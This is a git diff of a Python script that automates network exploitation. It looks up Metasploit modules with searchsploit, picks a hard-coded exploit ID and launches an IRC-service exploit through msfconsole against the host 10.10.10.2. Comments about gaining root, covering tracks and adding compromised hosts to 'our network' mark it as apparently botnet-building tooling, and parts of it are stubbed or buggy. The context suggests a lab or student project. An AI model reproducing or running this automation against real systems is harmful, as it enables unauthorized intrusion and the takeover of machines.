@@ -85,55 +85,81 @@ class DatabaseFind:
         else:
             pass
         self.output_to_json(host)
+        self.choose_exploits(host)
         return 0
 
+    #make the output into usable json
     def output_to_json(self, host):
-        #make the output into usable json
         data_json = []
+        #open the raw output file
         with open(host.exploits_file, 'r') as fi:
+            #read the file minus the first two lines (they are garbage)
             data = '\n'.join(fi.read().splitlines()[2:])
+            #each exploit is separated by 3 newline chars
             for exp in data.split('\n\n\n'):
                 data_json.append(json.loads(exp))
+        #now that we have a json object, loop through and add them
+        #to information about the host
         for i in data_json: 
             if len(i['RESULTS_EXPLOIT']):
                 for exp in i['RESULTS_EXPLOIT']:
                     if 'Metasploit' in exp['Title']: 
-                        #print('\n[*]EXPLOIT FOUND: ' + str(exp))
+                        print('\n[*]EXPLOIT FOUND: ' + str(exp))
                         host.exploits.append(exp)
             if len(i['RESULTS_SHELLCODE']): 
                 for shell in i['RESULTS_SHELLCODE']:
                     if 'Metasploit' in exp['Title']: 
                         print('[*]SHELLCODE FOUND: ' + str(shell))
-        self.choose_exploits(host)
     
     def choose_exploits(self, host):
         #pick the exploit to use
         #for now this will be hard-coded to use one exploit
         exploits = []
+        exp_num = '16922' 
         if not (os.path.exists(msf_exploit_dir)):
             print('path not here!')
             os.makedirs(msf_exploit_dir)
         for exploit in host.exploits:
-            if exploit['EDB-ID'] == '16921':
+            if exploit['EDB-ID'] == exp_num:
                 ssquery = "searchsploit -m " + exploit['EDB-ID']
                 ssproc = subprocess.Popen(
                     ssquery.split(),
                     stdout = subprocess.PIPE)
                 sys.stdout.flush()
                 ssproc.communicate()
-        mv_cmd = '"mv /root/reu/*.rb" ' + msf_exploit_dir
-        subprocess.call(mv_cmd.split())
+                with open(exp_num + '.rb', 'r') as file:
+                    exploit = file.readlines()
+                exploits.append(exploit[1].split()[2].split('.')[0])
+                subprocess.call(['rm', exp_num + '.rb'])
+        #mv_cmd = "mv /root/reu/" + exp_num + ".rb "  + msf_exploit_dir
+        #subprocess.call(mv_cmd.split())
+        #override the old exploit data
+        host.exploits = exploits
 
 #actually run the exploit against the target
 class Exploit:
 
     def __init__(self):
-        self.msfp = None
+        subprocess.call('msfrcpd -P lolol'.split())
         print('[+]Exploit framework initialized.')
 
-    def exploit(self, exploit_data, target_url):
-        print('[+]Exploited. Creating backdoor')
+    def exploit(self, host):
+        #search for equivalent exploit
 
+        #choose that exploit
+
+        #fill out options for exploit
+
+        #execute
+
+        #keep session in background
+        msf_cmd = 'msfconsole -x \
+                "use exploit/unix/irc/'+host.exploits[0]+';\
+                set RHOST 10.10.10.2;\
+                exploit;"'
+        output = subprocess.Popen(msf_cmd.split())
+        print(output)
+        
 #if necessary, first gain root
 #cover tracks
 #install files and programs necessary to add host to our network
@@ -143,10 +169,8 @@ class PostExploitation:
         print('[+]Created ')
 
     def load_files(self):
-        print('[+]Downloading and executing files.')
-        print('[+]Host added to network.')
-        if(not post_debug):
-            subprocess.Popen(['rm','-rf',msf_exploit_dir])
+
+
 
 class BotController:
 
@@ -159,16 +183,10 @@ class BotController:
 
     def exploit_target(self, host, attack_type):
         self.scanner.scan_network(host, attack_type)
+        
         print('[+]The following services were found:')
-        for port in host.open_ports:
-            print('[*]Port {} is running {} {} version {}'.format(
-                port, 
-                host.open_ports[port]['vendor'], 
-                host.open_ports[port]['product'], 
-                host.open_ports[port]['version']))
-        exploit_data = self.finder.search_database(host, attack_type)
-        self.exp.exploit(exploit_data, host.ip_addr)
-        self.post_exp.load_files()
+        if(not post_debug):
+            subprocess.Popen(['rm','-rf',msf_exploit_dir])
 
 def console():
     #make sure user is root
